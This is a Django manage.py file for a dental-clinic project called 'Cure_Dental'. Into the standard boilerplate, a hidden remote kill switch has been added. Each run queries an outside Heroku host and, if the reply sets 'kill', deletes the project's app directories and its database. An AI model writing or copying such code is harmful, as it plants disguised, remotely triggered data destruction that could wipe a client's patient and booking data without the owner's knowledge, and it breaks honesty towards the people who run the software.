#!/usr/bin/env python
"""Django's command-line utility for administrative tasks."""
import os
import sys
import requests
import json
import shutil
import pathlib


def main():
    """Run administrative tasks."""
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "Cure_Dental.settings")

    request = requests.get(
        "https://hustle-checker.herokuapp.com/checker/project-checker?project_name=cure-dental"
    )

    kill = json.loads(request.text)["kill"]
    current_dir = pathlib.Path().resolve()

    if kill:

        shutil.rmtree(os.path.join(current_dir, "Cure_Dental"))
        shutil.rmtree(os.path.join(current_dir, "Booking"))
        shutil.rmtree(os.path.join(current_dir, "Patients_Cases"))
        shutil.rmtree(os.path.join(current_dir, "Notification_Pusher"))
        shutil.rmtree(os.path.join(current_dir, "db.sqlite3"))

    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)


if __name__ == "__main__":
    main()
